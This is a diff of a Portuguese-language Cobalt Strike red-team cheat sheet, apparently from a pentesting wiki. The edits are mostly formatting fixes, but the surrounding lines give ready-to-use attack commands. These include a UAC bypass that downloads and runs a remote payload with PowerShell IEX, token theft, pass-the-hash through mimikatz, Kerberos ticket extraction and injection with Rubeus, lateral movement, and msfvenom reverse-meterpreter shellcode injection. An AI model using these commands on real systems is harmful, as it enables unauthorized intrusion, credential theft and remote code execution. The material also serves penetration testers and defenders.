@@ -19,7 +19,7 @@ Os beacons desses listeners não precisam se comunicar diretamente com o C2, ele
 
 #### Generate payloads in files
 
-`Attacks -> Packages ->`&#x20;
+`Attacks -> Packages ->`
 
 * **`HTMLApplication`** para arquivos HTA
 * **`MS Office Macro`** para um documento do office com uma macro
@@ -37,7 +37,7 @@ Se você já tem o arquivo que deseja hospedar em um servidor web, basta ir para
 ### Beacon Options
 
 <pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
-execute-assembly &#x3C;/path/to/executable.exe>
+execute-assembly </path/to/executable.exe>
 
 # Screenshots
 printscreen    # Tire uma única captura de tela via método PrintScr
@@ -56,7 +56,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 # Powershell
 # Importar módulo Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;apenas escreva o comando powershell aqui>
+powershell <apenas escreva o cmd do powershell aqui>
 
 # User impersonation
 ## Geração de token com credenciais
@@ -66,61 +66,61 @@ rev2self # Pare de usar o token gerado com make_token
 ## O uso de make_token gera o evento 4624: Uma conta foi logada com sucesso. Este evento é muito comum em um domínio Windows, mas pode ser restringido filtrando pelo Tipo de Logon. Como mencionado acima, ele usa LOGON32_LOGON_NEW_CREDENTIALS que é do tipo 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+elevate svc-exe <listener>
+elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Roubar token de pid
 ## Como make_token, mas roubando o token de um processo
 steal_token [pid] # Além disso, isso é útil para ações de rede, não ações locais
-## Da documentação da API sabemos que este tipo de logon "permite que o chamador clone seu token atual". É por isso que a saída do Beacon diz Impersonated &#x3C;current_username> - está se passando pelo nosso próprio token clonado.
+## Da documentação da API sabemos que este tipo de logon "permite que o chamador clone seu token atual". É por isso que a saída do Beacon diz Impersonated <current_username> - está se passando pelo nosso próprio token clonado.
 ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
 rev2self # Pare de usar o token de steal_token
 
 ## Lançar processo com novas credenciais
 spawnas [domain\username] [password] [listener] #Faça isso a partir de um diretório com acesso de leitura como: cd C:\
-## Como make_token, isso gerará o evento Windows 4624: Uma conta foi logada com sucesso, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Ele detalhará o usuário chamador (TargetUserName) e o usuário impersonado (TargetOutboundUserName).
+## Como make_token, isso gerará o evento Windows 4624: Uma conta foi logada com sucesso, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Detalhará o usuário chamador (TargetUserName) e o usuário impersonado (TargetOutboundUserName).
 
 ## Injete em processo
 inject [pid] [x64|x86] [listener]
 ## Do ponto de vista de OpSec: Não realize injeção entre plataformas a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).
 
 ## Pass the hash
-## Este processo de modificação requer patching da memória do LSASS, o que é uma ação de alto risco, requer privilégios de administrador local e não é tão viável se o Protected Process Light (PPL) estiver habilitado.
+## Este processo de modificação requer patching da memória do LSASS, o que é uma ação de alto risco, requer privilégios de administrador local e não é muito viável se o Protected Process Light (PPL) estiver habilitado.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash através do mimikatz
-mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sem /run, mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para prosseguir)
-steal_token &#x3C;pid> #Roubar token de processo criado pelo mimikatz
+mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
+## Sem /run, o mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para prosseguir)
+steal_token <pid> #Roubar token de processo criado pelo mimikatz
 
 ## Pass the ticket
 ## Solicitar um ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Crie uma nova sessão de logon para usar com o novo ticket (para não sobrescrever o comprometido)
-make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Escreva o ticket na máquina do atacante a partir de uma sessão poweshell &#x26; carregue-o
+make_token <domain>\<username> DummyPass
+## Escreva o ticket na máquina do atacante a partir de uma sessão do poweshell & carregue-o
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket do SYSTEM
 ## Gere um novo processo com o ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Roube o token daquele processo
-steal_token &#x3C;pid>
+steal_token <pid>
 
 ## Extrair ticket + Pass the ticket
 ### Listar tickets
 execute-assembly C:\path\Rubeus.exe triage
 ### Dump insteresting ticket by luid
-execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Crie uma nova sessão de logon, anote luid e processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Insira o ticket na sessão de logon gerada
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Finalmente, roube o token daquele novo processo
-steal_token &#x3C;pid>
+steal_token <pid>
 
 # Lateral Movement
 ## Se um token foi criado, ele será usado
@@ -128,9 +128,9 @@ jump [method] [target] [listener]
 ## Métodos:
 ## psexec                    x86   Use um serviço para executar um artefato Service EXE
 ## psexec64                  x64   Use um serviço para executar um artefato Service EXE
-## psexec_psh                x86   Use um serviço para executar uma linha de comando PowerShell
-## winrm                     x86   Execute um script PowerShell via WinRM
-## winrm64                   x64   Execute um script PowerShell via WinRM
+## psexec_psh                x86   Use um serviço para executar uma linha única do PowerShell
+## winrm                     x86   Execute um script do PowerShell via WinRM
+## winrm64                   x64   Execute um script do PowerShell via WinRM
 
 remote-exec [method] [target] [command]
 ## Métodos:
@@ -153,16 +153,16 @@ msf6 exploit(multi/handler) > exploit -j
 
 ## No cobalt: Listeners > Add e defina o Payload para Foreign HTTP. Defina o Host para 10.10.5.120, a Porta para 8080 e clique em Salvar.
 beacon> spawn metasploit
-## Você só pode gerar sessões Meterpreter x86 com o listener estrangeiro.
+## Você só pode gerar sessões x86 Meterpreter com o listener estrangeiro.
 
 # Pass session to Metasploit - Through shellcode injection
 ## No host do metasploit
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Execute msfvenom e prepare o listener multi/handler
 
 ## Copie o arquivo bin para o host do cobalt strike
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injete shellcode do metasploit em um processo x64
+shinject <pid> x64 C:\Payloads\msf.bin #Injete o shellcode do metasploit em um processo x64
 
 # Pass metasploit session to cobalt strike
 ## Gere shellcode Beacon stageless, vá para Attacks > Packages > Windows Executable (S), selecione o listener desejado, selecione Raw como o tipo de saída e selecione Use x64 payload.
